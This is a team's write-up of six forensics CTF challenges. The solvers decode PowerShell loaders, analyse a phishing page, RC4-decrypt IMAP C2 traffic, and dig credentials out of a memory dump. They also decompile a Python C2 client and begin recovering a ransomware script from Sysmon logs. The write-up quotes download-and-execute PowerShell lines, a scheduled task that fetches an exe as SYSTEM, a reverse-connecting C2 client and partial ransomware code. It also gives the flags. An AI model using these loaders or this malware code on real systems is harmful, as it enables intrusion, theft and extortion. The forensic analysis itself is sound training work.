# forensics



## Thorins Amulet

> Solved by Starry-Lord


![](https://i.imgur.com/KHsPmEl.png)


inside the zip downloadable we could find `artifact.ps1` :


    function qt4PO {
        if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
            exit
        }
        powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
    }
    qt4PO

Base 64 string decoded to the following:


    IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")

But it was not giving a connection unless you had the correct `COMPUTERNAME` environement variable. This will temporarily change it:


    $env:COMPUTERNAME = "WORKSTATION-DM-0043"

With that we could run the powershell if we wanted, but visiting the url from the challenge docker was enough to get to the next stage which returned an `update.ps1`:


    function aqFVaq {
        Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
        powershell.exe -exec Bypass -File "a541a.ps1"
    }
    aqFVaq

This time I used curl with headers in order to pass the `X-ST4G3R-KEY` which was needed to get the last bit:

curl command:

    curl -H "X-ST4G3R-KEY:5337d322906ff18afedc1edc191d325d" http://94.237.57.230:59390/a541a

a541a.ps1:

    $a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
    ($a35-split"(..)"|?{$_}|%{\[char\][convert]::ToInt16($_,16)}) -join ""

Decode hex for the flag:

    HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}


----------
## A new Hire
> Solved by Starry-Lord


    Return-Path: <elowan81@eldor.ia>
    Received: from mail-sor-f41.eldor.ia (mail-sor-f41.eldor.ia [209.85.220.41])
        by mx.eldor.ia (Postfix) with ESMTPS id A1B2C3D4E5F6
        for <work@eldor.ia>; Mon, 01 Jan 2024 12:34:56 -0700 (PDT)
        (version=TLS1.3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256)
    Received: from [192.168.1.100] (customer-pool-192-168-1-100.eldor.ia [192.168.1.100])
        by mail-sor-f41.eldor.ia with ESMTPSA id F6E5D4C3B2A1
        for <work@eldor.ia>; Mon, 01 Jan 2024 12:34:55 -0700 (PDT)
        (version=TLS1.2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128)
    Authentication-Results: mx.eldor.ia;
        dkim=pass header.d=eldor.ia header.s=default header.b="3nw7H9qL1vXf5T8sK2zY6pB4rQ0eC7uM";
        spf=pass (mx.eldor.ia: domain of elowan81@eldor.ia designates 209.85.220.41 as permitted sender) smtp.mailfrom=elowan81@eldor.ia;
        dmarc=pass (p=quarantine sp=reject) header.from=eldor.ia
    DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=eldor.ia; s=default; t=1704123295;
        h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
        bh=Qm6qK81lr9XH/FGV5tS2kD3pW4aI7m2xZv9d1kE6cT8y=;
        b=V8pPz1n+R2tW4yZ6aB8cD0eF2gH4iJ6kL8mN0oP2qR4sT6uV8wX0yZ2aB4cD6eF8
         gH0iJ2kL4mN6oP8qR0sT2uV4wX6yZ8aB0cD2eF4gH6iJ8kL0mN2oP4qR6sT8uV0wX2yZ4;
    Received-SPF: pass (mx.eldor.ia: domain of elowan81@eldor.ia designates 209.85.220.41 as permitted sender) client-ip=209.85.220.41;
    ARC-Authentication-Results: i=1; mx.eldor.ia;
        dkim=pass header.d=eldor.ia header.s=default header.b="3nw7H9qL1vXf5T8sK2zY6pB4rQ0eC7uM";
        spf=pass smtp.mailfrom=elowan81@eldor.ia;
        dmarc=pass (p=quarantine sp=reject) header.from=eldor.ia
    ARC-Seal: i=1; a=rsa-sha256; t=1704123295; cv=none;
        d=eldor.ia; s=arc20240101;
        b=n8U2w3v1y7Z4x6T9r5q0p3o1l7m6k2j8i4h1g3f5d7s9a0b2c4e6r8t0y5u3w1x2
         a9b7c5d3e1f0g2h4i6j8k0l2m4n6o8p0q2r4s6t8u0v2w4x6y8z0A2B4C6D8E0F2G4;
    ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
        d=eldor.ia; s=arc20240101;
        h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
        bh=Qm6qK81lr9XH/FGV5tS2kD3pW4aI7m2xZv9d1kE6cT8y=;
        b=k4n5o6p7q8r9s0t1u2v3w4x5y6z7A8B9C0D1E2F3G4H5I6J7K8L9M0N1O2P3Q4R5
         S6T7U8V9W0X1Y2Z3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8;
    Message-ID: <20240101123456.1234567890@mail-sor-f41.eldor.ia>
    From: "Elowan" <elowan81@eldor.ia>
    To: "Work" <work@eldor.ia>
    Subject: Job Application - Resume Review 
    Date: Mon, 01 Jan 2024 12:34:56 -0700
    MIME-Version: 1.0
    Content-Type: text/plain; charset="UTF-8"
    Content-Transfer-Encoding: 7bit
    
    Hello Work Team,
    
    I hope this email finds you well. We have received a new application for the open position, and we wanted to bring it to your attention.
    
    The applicant, Lord Malakar, has an extensive background in leadership, strategic planning, and resource management. 
    With years of experience commanding large-scale operations, overseeing tactical deployments, and influencing key stakeholders, Malakar believes he would be a strong asset to your organization.
    
    Key Highlights from His Experience:
    
    Strategic Leadership: Spearheaded large-scale initiatives that reshaped industry landscapes.
    Crisis Management: Adept at handling high-pressure situations and making decisive calls.
    Team Motivation: Known for fostering loyalty and rallying teams toward ambitious goals.
    Innovative Thinking: Developed groundbreaking methods to enhance efficiency and control.
    We believe Malakar’s skills and experience could be a great fit for your team, and he is eager to discuss how he can contribute to [Company Name]’s continued success.
    
    You can review his resume here:
    `storage.microsoftcloudservices.com:[PORT]/index.php`
    
    Please let us know if you would like to proceed with the next steps in the hiring process.
    
    Best regards,
    Elowan
    
    PS: Make sure you replace the '[PORT]' with your instance's port. Additionally, make sure that any hostnames that are found point to your instance's IP address!
    

visit the url, press the button to see nothing happens, and find the script:


![](https://i.imgur.com/Eo7EL5m.png)


Visit http://docker-ip:port/3fe1690d955e8fd2a0b282501570e1f4/resumesS/resume_official.pdf
for Malakar’s Resume

then http://94.237.63.165:30920/3fe1690d955e8fd2a0b282501570e1f4/configs/client.py
for the flag:


![](https://i.imgur.com/ECso4Yu.png)

    HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}


----------
## Silent Trap
> Solved by Starry-Lord


![](https://i.imgur.com/niU7beE.png)


For this challenge we had a packet capture to read with wireshark.

Question 1:
First mail opened and replied to:

![](https://i.imgur.com/VNm3FLv.png)


Answer: 

    Game Crash on Level 5

Question 2:

![](https://i.imgur.com/xnFooRH.png)


Answer:

    2025-02-24_15:46

Question 3:
This started to become interesting now. The zip was not cracking with any dictionary I had but I eventually found this packet with the content of the email, with password for the zip:

![](https://i.imgur.com/F2Gaenv.png)



![](https://i.imgur.com/dMd0xzC.png)

    eldoriaismylife

Then taking the hash for the pdf.exe file inside the archive.

Question 4:
Credentials used to log in the attacker mailbox were the following:


![](https://i.imgur.com/XIPDg73.png)

    proplayer@email.com:completed

Question 5:
The task scheduled by the attacker could be found by decrypting the encrpyted base64 looking strings in IMAP protocol packets, so it was time to look into the executable received:


    file Eldoria_Balance_Issue_Report.pdf.exe                                                                                                                                                                                              
    Eldoria_Balance_Issue_Report.pdf.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections

I disabled defender because it was eating the file sent from wsl to Windows, and used ILSpy which allowed me to find out the xor key used for obfuscating the messages sent through IMAP/IMF packets. Following the streams in Wireshark allowed to see a few of them:

![](https://i.imgur.com/LmkRRmr.png)


About the executable, `<PrivateImplementationDetails>` which was only visible with IL in ILspy was showing 2 possible candidates for a 256 bytes xor key as follows:


    .class private auto ansi '<Module>'
    {
    } // end of class <Module>
    
    .class private auto ansi sealed '<PrivateImplementationDetails>'
        extends [mscorlib]System.Object
    {
        .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = (
            01 00 00 00
        )
        // Nested Types
        .class nested private explicit ansi sealed '__StaticArrayInitTypeSize=256'
            extends [mscorlib]System.ValueType
        {
            .pack 1
            .size 256
    
        } // end of class __StaticArrayInitTypeSize=256
    
    
        // Fields
        .field assembly static initonly valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=256' ACC3B83AE99DC619D5DE5E5089E213F9DD3B830C549DD557E66A456CA3BB3660 at I_00002050
        .data cil I_00002050 = bytearray (
            8c 18 63 4c 63 74 ce 4e 75 f1 55 f8 06 80 8f 05
            32 fe f8 a8 47 2d b2 54 33 90 a3 a4 8c b6 9b 7c
            b1 43 bc e1 39 91 9d 33 c2 09 22 01 70 f0 d9 8f
            de 4f a4 97 f6 68 ec 18 0a e2 9f 13 db ec e3 3e
            97 d5 e8 43 86 19 ce 70 28 3d dc 0a 39 2a 27 19
            3a 04 3e 02 6f c4 5e b3 9a 44 f3 52 6f 80 f7 20
            f3 96 6a a1 71 be 57 74 83 be 7d 1c f6 0b 50 cc
            96 ba 56 fe e5 49 09 a3 19 e3 c9 45 b3 42 b8 9e
            ad a4 90 ea 86 31 90 8f 2e 28 71 ef 55 6b f1 21
            e6 1d e9 35 1e 41 d1 9d 24 71 4b d0 71 aa 3e 22
            ce e9 16 d0 84 59 d9 07 16 70 b6 16 03 12 8a 5c
            2d 57 81 08 6d b1 1e 55 80 cc 55 cb ee 71 67 91
            c3 69 86 b9 10 86 30 5f a4 e4 7d 8e e3 70 e8 f1
            72 2c a8 cd a9 44 ed 8e 25 50 f2 9c a2 85 ec 63
            cd 89 3a 12 31 01 cb 92 7c e9 b7 96 47 ae 33 17
            26 06 6d 62 64 28 0c 9a 4a e5 40 c2 79 98 66 69
        )
    
    } // end of class <PrivateImplementationDetails>
    
    .class private auto ansi sealed '<PrivateImplementationDetails><5ceda002-b6a9-4e52-b13e-d38ba653d933_netmodule>'
        extends [mscorlib]System.Object
    {
        .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = (
            01 00 00 00
        )
        // Nested Types
        .class nested private explicit ansi sealed '__StaticArrayInitTypeSize=256'
            extends [mscorlib]System.ValueType
        {
            .pack 1
            .size 256
    
        } // end of class __StaticArrayInitTypeSize=256
    
    
        // Fields
        .field assembly static initonly valuetype '<PrivateImplementationDetails><5ceda002-b6a9-4e52-b13e-d38ba653d933_netmodule>'/'__StaticArrayInitTypeSize=256' '83F58C5748F2CE8CD1361409C48007E4CD0C037A70CD9FCD968880CFCCD616E2' at I_00002150
        .data cil I_00002150 = bytearray (
            a8 73 ae d5 a8 de 48 24 5b d1 f2 80 45 63 c3 a4
            ee b6 43 5c 07 79 a4 56 79 0a 5d 04 8c 6f f8 2c
            1e 5e 30 36 2d 64 b8 36 1c 52 c9 bc cb 96 7b a3
            e5 8a b1 33 a4 e8 56 9a b3 8f 90 16 86 0c 28 f3
            37 02 49 67 63 f3 ec 77 09 78 f7 19 84 89 43 42
            6f f0 6c 56 55 3f 2c 31 f1 06 03 aa 83 96 35 31
            7e 48 3c 24 90 f8 37 0a f1 d0 a3 d9 31 9a ce e3
            19 63 12 90 86 a9 ed 64 75 16 0b 96 9d e6 ad 26
            48 63 81 1e dc 70 e2 38 10 72 85 16 60 01 5a 48
            a2 26 8f ba 23 8e 80 ea c4 ef 86 b2 cd e5 79 e1
            f6 e8 cd ec fe 98 91 62 7e 1d d9 4a b1 8e 13 be
            b6 97 e9 9d 4c 4a 68 9b 4f 73 05 12 cc 41 fe cc
            76 47 5c 21 3a 70 ce 97 67 b3 18 a4 db 62 51 06
            f1 64 e4 be 60 8c 80 01 a1 f6 ec 19 3e 64 57 91
            b9 2d 3d 8f 34 08 e3 20 e9 25 b7 65 59 18 7d cb
            e3 09 92 9c d0 ce c2 86 c2 17 e9 64 26 9e 3a 9f
        )
    
    } // end of class <PrivateImplementationDetails><5ceda002-b6a9-4e52-b13e-d38ba653d933_netmodule>
    

in the method `imap_chanel.Exor::Encrypt()` we could see a fe things happening: 

- Builds a key-scheduling array (`S`)
- Does the standard RC4 PRGA to encrypt/decrypt the data

`imap_chanel.Exor::Encrypt()`:


    // email, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
    // imap_chanel.Exor
    public static byte[] Encrypt(byte[] pwd, byte[] data)
    {
        int[] array = new int[256];
        int[] array2 = new int[256];
        byte[] array3 = new byte[data.Length];
        int i;
        for (i = 0; i < 256; i++)
        {
            array[i] = pwd[i % pwd.Length];
            array2[i] = i;
        }
        int num = (i = 0);
        for (; i < 256; i++)
        {
            num = (num + array2[i] + array[i]) % 256;
            int num2 = array2[i];
            array2[i] = array2[num];
            array2[num] = num2;
        }
        int num3 = (num = (i = 0));
        for (; i < data.Length; i++)
        {
            num3++;
            num3 %= 256;
            num += array2[num3];
            num %= 256;
            int num2 = array2[num3];
            array2[num3] = array2[num];
            array2[num] = num2;
            int num4 = array2[(array2[num3] + array2[num]) % 256];
            array3[i] = (byte)(data[i] ^ num4);
        }
        return array3;
    }

The code was looking very similar to RC4 https://en.wikipedia.org/wiki/RC4
We could see the blocs were very identical to the Key-scheduling algorithm (KSA) and the Pseudo Random Generation algorithm (PRGA) from wikipedia.

decrypt_rc4.py:


    #!/usr/bin/env python3
    import base64
    import sys
    
    # 256-byte RC4 key from malware binary
    key_bytes = bytes.fromhex("""
    a873aed5a8de48245bd1f2804563c3a4eeb6435c0779a456790a5d048c6ff82c
    1e5e30362d64b8361c52c9bccb967ba3e58ab133a4e8569ab38f9016860c28f3
    3702496763f3ec770978f719848943426ff06c56553f2c31f10603aa83963531
    7e483c2490f8370af1d0a3d9319acee31963129086a9ed6475160b969de6ad26
    4863811edc70e2381072851660015a48a2268fba238e80eac4ef86b2cde579e1
    f6e8cdecfe9891627e1dd94ab18e13beb697e99d4c4a689b4f730512cc41fecc
    76475c213a70ce9767b318a4db625106f164e4be608c8001a1f6ec193e645791
    b92d3d8f3408e320e925b76559187dcbe309929cd0cec286c217e964269e3a9f
    """)
    
    def rc4_crypt(data: bytes, key: bytes) -> bytes:
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
    
        i = j = 0
        out = bytearray()
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            K = S[(S[i] + S[j]) % 256]
            out.append(byte ^ K)
        return bytes(out)
    
    def main():
        if len(sys.argv) != 2:
            print("Usage: python decrypt_rc4.py <Base64Input>")
            sys.exit(1)
    
        b64_input = sys.argv[1]
        try:
            encrypted_bytes = base64.b64decode(b64_input)
        except Exception as e:
            print("Invalid Base64 input:", e)
            sys.exit(1)
    
        decrypted_bytes = rc4_crypt(encrypted_bytes, key_bytes)
    
        try:
            print("[+] Decrypted text:", decrypted_bytes.decode("utf-8"))
        except UnicodeDecodeError:
            print("[+] Decrypted bytes (non-UTF8):", decrypted_bytes)
    
    if __name__ == "__main__":
        main()
    

Back to question 5 about the name of the scheduled task:


    [+] Decrypted text: schtasks /create /tn Synchronization /tr "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\Temp\rakalam.exe" /sc minute /mo 1 /ru SYSTEM

Answer:

    Synchronization

Question 6: API key discovered by the attacker


![](https://i.imgur.com/bEqE9HY.png)


Answer:

    sk-3498fwe09r8fw3f98fw9832fw


----------
## Stealth Invasion
> Solved by thewhiteh4t


1. PID of original chrome process : `4080`

```    
    vol -f memdump.elf windows.cmdline.CmdLine
    4080 chrome.exe "C:\Program Files\Google\Chrome\Application\chrome.exe"
```

2. What is the only Folder on the Desktop : `malext`

```    
    vol -f memdump.elf windows.filescan.FileScan > file_list.txt
    0xa708c8d9ec30 \Users\selene\Desktop\malext\background.js
```

3. What is the Extention's ID : `nnjofihdjilebhiiemfmdlpbdkbjcpae`

```    
    cat file_list.txt | grep Chrome | grep Extension
    0xa708c8830c80 \Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae\LOG
```

4. After examining the malicious extention's code, what is the log filename in which the datais stored : `000003.log`

```    
    cat file_list.txt| grep Chrome | grep nnjofihdjilebhiiemfmdlpbdkbjcpae
    0xa708c8830c80 \Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae\LOG
    0xa708c8dd5be0 \Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae\MANIFEST-000001
    0xa708c8dda230 \Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae\CURRENTdbtmp
    0xa708c8f2b500 \Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae
    0xa708c8f2d760 \Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae
    0xa708cab9a2c0 \Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae\LOG
    0xa708caba14d0 \Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae\000003.log
```

5. What is the URL the user navigated to : `drive.google.com`

```
    vol -f memdump.elf windows.dumpfiles.DumpFiles --virtaddr 0xa708caba14d0
    cat file.0xa708caba14d0.0xa708c9d90d00.DataSectionObject.000003.log.dat
    log"drive.google.comEnter\r\nsel"�d�log"drive.google.comEnter\r\nsele" w
    3log!"drive.google.comEnter\r\nselene"|:log("drive.google.comEnter\r\nselene|Shift|"Xu@<;log)"drive.google.comEnter\r\nselene|Shift|@"�g<log*"drive.google.co
```

6. What is the password of selene@rangers.eldoria.com : `clip-mummify-proofs`

in the same log file :

```
    drive.google.comEnter\r\nselene|Shift|@rangers.eldoria.comEnter\r\nclip-mummify-proofs"8jsAloga"drive.google.comEnter\r\nselene|Shift|@rangers.eldoria.comEnter\r\nclip-mummify-proofsEnter\r\n
```

----------


## ToolPie
> Solved by thewhiteh4t


- We were given a PCAP in this challenge


1. What is the IP address responsible for compromising the website?
    1. based on POST requests in the PCAP : `194.59.6.66`
2. What is the name of the endpoint exploited by the attacker?
    1. based on POST requests : `/execute`
3. What is the name of the obfuscation tool used by the attacker?
    1. simply printing the script found above shows a code object which contains a string : `Py-Fuscate`

```    
    # replaced exec() with print()
    > python chal.py
    <code object <module> at 0x555555605650, file "Py-Fuscate", line 1>
```

4. What is the IP address and port used by the malware to establish a connection with the Command and Control (C2) server?
    1. To find this first we need to get the plain text code, what we have is a `python code object`, we can create `pyc` file which is bytecode and get plaintext from it using tools like `uncompyle6`, `decompyle3` or `pycdc`
    2. However none of the tools worked due to python version mismatch, so I found `pylingual`
    3. in the code we can see the ip and port : `13.61.7.218:55155`

```
    # Decompiled with PyLingual (https://pylingual.io)
    # Internal filename: Py-Fuscate
    # Bytecode version: 3.13.0rc3 (3571)
    # Source timestamp: 2025-03-24 20:26:54 UTC (1742848014)
    from os import popen
    pass
    pass
    import socket
    import threading
    import os
    import time
    import random
    import string
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    user = os.popen('whoami').read()
    BUFFER_SIZE = 4096
    SEPARATOR = '<SEPARATOR>'
    CONN = True
    def enc_mes(mes, key):
        try:
            cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
            cypher_block = 16
            mes = mes.encode() if type(mes)!= bytes else mes
            return cypher.encrypt(pad(mes, cypher_block))
        except:
            return None
    def dec_file_mes(mes, key):
        cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
        cypher_block = 16
        s = cypher.decrypt(mes)
        return unpad(s, cypher_block)
    def dec_mes(mes, key):
        if mes == b'':
            return mes
    def receive_file():
        try:
            client2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client2.connect(('13.61.7.218', 54163))
            k = ''.join((random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16)))
            client2.send(k.encode())
            pass
            enc_received = client2.recv(BUFFER_SIZE)
            received = dec_mes(enc_received, k).decode()
            filename, filesize = received.split(SEPARATOR)
            ok_enc = enc_mes('ok2', k)
            client2.send(ok_enc)
            total_bytes = 0
            msg = b''
            if total_bytes < int(filesize):
                bytes_read = client2.recv(BUFFER_SIZE)
                msg += bytes_read
                total_bytes += len(bytes_read)
            decr_file = dec_mes(msg, k)
            with open(filename, 'wb') as f:
                f.write(decr_file)
                    pass
                    client2.close()
        except:
            pass  # postinserted
        client2.send('Error transporting file'.encode())
    def receive(client, k):
        pass
        try:
            pass  # postinserted
        s += 1
        msg = client.recv(1024)
        raise Exception('Reconnect!') if s == 300 else True if msg == b'' else False
        except:
            pass  # postinserted
        pass
        try:
            pass  # postinserted
        client.close()
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(('13.61.7.218', 55155))
        k = ''.join((random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16)))
        client.send(f'{user}{SEPARATOR}{k}'.encode())
        client.settimeout(600)
        time.sleep(60)
        except:
            time.sleep(60)
    if __name__ == '__main__':
        pass
        try:
            pass  # postinserted
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(('13.61.7.218', 55155))
        k = ''.join((random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16)))
        client.send(f'{user}{SEPARATOR}{k}'.encode())
        client.settimeout(600)
        break
        receive_thread = threading.Thread(target=receive, args=(client, k))
        receive_thread.start()
    except:
        pass  # postinserted
    time.sleep(50)
```

5. What encryption key did the attacker use to secure the data?
    1. in the code we can see where the key is sent : `client.send(f'{user}{SEPARATOR}{k}'.encode())`
    2. we can look for this pattern in the PCAP : `ec2amaz-bktvi3e\administrator\n5UUfizsRsP7oOCAq` so the key is : `5UUfizsRsP7oOCAq`


6. What is the MD5 hash of the file exfiltrated by the attacker?
    1. since we have the key, we can write our own decryption script
    2. first we need to extract data chunks from the PCAP using `tshark -2 -r capture.pcap -R "tcp.stream eq 4 and data.data" -T fields -e data.data > datafile.txt`
    3. now we can write a script to parse data chunks and decrypt the stolen files

```
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    
    def dec_file_mes(mes, key):
        cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
        cypher_block = 16
        s = cypher.decrypt(mes)
        return unpad(s, cypher_block)
    
    key = '5UUfizsRsP7oOCAq'
    
    filename = None
    size = 0
    container = b''
    filling = False
    got_size = False
    
    with open('datafile.txt') as encfile:
        hex_lines = encfile.readlines()
        for line in hex_lines:
            got_name = False
            if filename:
                got_name = True
    
            msg = bytes.fromhex(line)
            if b'SEPARATOR' in msg:
                continue
    
            if not filling:
                decr_file = dec_file_mes(msg, key)
                if b'C:' in decr_file:
                    filename = decr_file.decode().split('\\')[-1]
                    print('[+] Filename : ', filename)
                if got_name and not got_size:
                    if int(decr_file.decode()):
                        size = int(decr_file.decode())
                        print('[+] File Size : ', size)
                        got_size = True
                if size and b'ok' in decr_file:  # handle last ok msg after size
                    filling = True
            else:
                if len(container) != size:
                    container += msg
    
        decr_file = dec_file_mes(container, key)
        print(f'[+] Writing : {filename}')
        with open(filename, 'wb') as outfile:
            outfile.write(decr_file)
```    


![](https://i.imgur.com/8nMLOhx.png)


MD5 Hash : `8fde053c8e79cf7e03599d559f90b321`


----------


## Cave Expedition
> Solved by thewhiteh4t


- Multiple EVTX files i.e. windows event logs are provided, but it looks like the malware cleared all the logs but left one

```
    > ls -lah | grep -v 68K
    total 30M
    drwxr-xr-x 2 twh twh  44K Mar 27 12:19 .
    drwxr-xr-x 3 twh twh 4.0K Mar 27 12:19 ..
    -rw-r--r-- 1 twh twh 1.1M Jan 28 10:31 Microsoft-Windows-Sysmon_Operational.evtx
```

- I used `evtx_dump` to extract events from EVTX files and convert them into JSON for easier parsing

```
    > evtx_dump Microsoft-Windows-Sysmon_Operational.evtx -o jsonl -f sysmon.json
```

- Now we can write a parser and extract powershell code from the logs :

```
    import json
    
    with open('sysmon.json') as infile:
            data = infile.readlines()
    
    sequence = []
    
    for line in data:
            json_line = json.loads(line)
            try:
                    sequence.append(json_line\['Event'\]['EventData']['CommandLine'])
            except KeyError:
                    pass
    
    for cmdline in sequence:
            if 'wevtutil' in cmdline:
                    continue
            print(cmdline)
```

![](https://i.imgur.com/JU56fAW.png)

- As we can see `Append -NoNewline` is used so we will concatenate all the base64 strings

```
    > cat b64_ps.txt
    JGszNFZtID0gIktpNTBlSFFnS2k1a2IyTWdLaTVrYjJONElDb3VjR1JtIg0KJG03OFZvID0gIkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFFwWlQxVlNJRVpKVEVWVElFaEJWa1VnUWtWRlRpQkZUa05TV1ZCVVJVUWdRbGtnUVNCU1FVNVRUMDFYUVZKRkNpb2dWMmhoZENCb1lYQndaVzVsWkQ4S1RXOXpkQ0J2WmlCNWIzVnlJR1pwYkdWeklHRnlaU0J1YnlCc2IyNW5aWElnWVdOalpYTnphV0pzWlNCaVpXTmhkWE5sSUhSb1pYa2dhR0YyWlNCaVpXVnVJR1Z1WTNKNWNIUmxaQzRnUkc4Z2JtOTBJS
    ...
```

- After decoding in cyberchef we get the actual powershell script

```
    > cat attack.ps1
    $k34Vm = "Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"
    $m78Vo = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo="
    $a53Va = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
    $b64Vb = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"
    
    $e90Vg = @{}
    $f12Vh = @{}
    
    For ($x = 65; $x -le 90; $x++) {
        $e90Vg\[([char]$x)] = if($x -eq 90) { [char]65 } else { [char\]($x + 1) }
    }
    
    function n90Vp {
         [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m78Vo))
    }
    
    function l56Vn {
        return (a12Vc $k34Vm).Split(" ")
    }
    
    For ($x = 97; $x -le 122; $x++) {
        $e90Vg\[([char]$x)] = if($x -eq 122) { [char]97 } else { [char\]($x + 1) }
    }
    
    function a12Vc {
        param([string]$a34Vd)
        return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a34Vd))
    }
    
    $c56Ve = a12Vc $a53Va
    $d78Vf = a12Vc $b64Vb
    
    For ($x = 48; $x -le 57; $x++) {
        $e90Vg\[([char]$x)] = if($x -eq 57) { [char]48 } else { [char\]($x + 1) }
    }
    
    $e90Vg.GetEnumerator() | ForEach-Object {
        $f12Vh[$_.Value] = $_.Key
    }
    
    function l34Vn {
        param([byte[]]$m56Vo, [byte[]]$n78Vp, [byte[]]$o90Vq)
        $p12Vr = [byte[]]::new($m56Vo.Length)
        for ($x = 0; $x -lt $m56Vo.Length; $x++) {
            $q34Vs = $n78Vp[$x % $n78Vp.Length]
            $r56Vt = $o90Vq[$x % $o90Vq.Length]
            $p12Vr[$x] = $m56Vo[$x] -bxor $q34Vs -bxor $r56Vt
        }
        return $p12Vr
    }
    
    function s78Vu {
        param([byte[]]$t90Vv, [string]$u12Vw, [string]$v34Vx)
    
        if ($t90Vv -eq $null -or $t90Vv.Length -eq 0) {
            return $null
        }
    
        $y90Va = [System.Text.Encoding]::UTF8.GetBytes($u12Vw)
        $z12Vb = [System.Text.Encoding]::UTF8.GetBytes($v34Vx)
